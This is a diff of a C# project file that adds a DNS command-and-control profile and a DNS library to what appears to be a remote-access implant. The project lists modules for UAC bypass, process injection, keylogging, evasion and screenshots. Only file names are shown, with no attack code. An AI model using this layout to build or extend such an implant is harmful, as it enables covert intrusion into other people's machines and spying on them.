@@ -121,6 +121,7 @@
     <Reference Include="System.Xml" />
   </ItemGroup>
   <ItemGroup>
+    <Compile Include="C2Profiles\DNSProfile.cs" />
     <Compile Include="CommandModules\BypassUac.cs" />
     <Compile Include="CommandModules\Inject.cs" />
     <Compile Include="CommandModules\Keylog.cs" />
@@ -135,6 +136,33 @@
     <Compile Include="CommandModules\RegistryManager.cs" />
     <Compile Include="CommandModules\Socks.cs" />
     <Compile Include="CommandModules\Spawn.cs" />
+    <Compile Include="DnsRip\Enums.cs" />
+    <Compile Include="DnsRip\Extensions\Extensions.cs" />
+    <Compile Include="DnsRip\Models\DnsHeader.cs" />
+    <Compile Include="DnsRip\Models\DnsQuestion.cs" />
+    <Compile Include="DnsRip\Models\DnsRequest.cs" />
+    <Compile Include="DnsRip\Models\DnsResponse.cs" />
+    <Compile Include="DnsRip\Models\ParseResult.cs" />
+    <Compile Include="DnsRip\Models\Record.cs" />
+    <Compile Include="DnsRip\Models\RecordA.cs" />
+    <Compile Include="DnsRip\Models\RecordAaaa.cs" />
+    <Compile Include="DnsRip\Models\RecordCName.cs" />
+    <Compile Include="DnsRip\Models\RecordMx.cs" />
+    <Compile Include="DnsRip\Models\RecordNs.cs" />
+    <Compile Include="DnsRip\Models\RecordPtr.cs" />
+    <Compile Include="DnsRip\Models\RecordSoa.cs" />
+    <Compile Include="DnsRip\Models\RecordTxt.cs" />
+    <Compile Include="DnsRip\Models\RecordUnknown.cs" />
+    <Compile Include="DnsRip\Models\ResolveResponse.cs" />
+    <Compile Include="DnsRip\Parser.cs" />
+    <Compile Include="DnsRip\Resolver.cs" />
+    <Compile Include="DnsRip\Utilities\AdditionalReader.cs" />
+    <Compile Include="DnsRip\Utilities\AnswerReader.cs" />
+    <Compile Include="DnsRip\Utilities\AuthorityReader.cs" />
+    <Compile Include="DnsRip\Utilities\RecordHelper.cs" />
+    <Compile Include="DnsRip\Utilities\RecordReader.cs" />
+    <Compile Include="DnsRip\Utilities\SocketHelper.cs" />
+    <Compile Include="DnsRip\Utilities\Validator.cs" />
     <Compile Include="Evasion\EvasionManager.cs" />
     <Compile Include="Injection\QueueUserAPCInjection.cs" />
     <Compile Include="IPC\ScrenshotMessage.cs" />
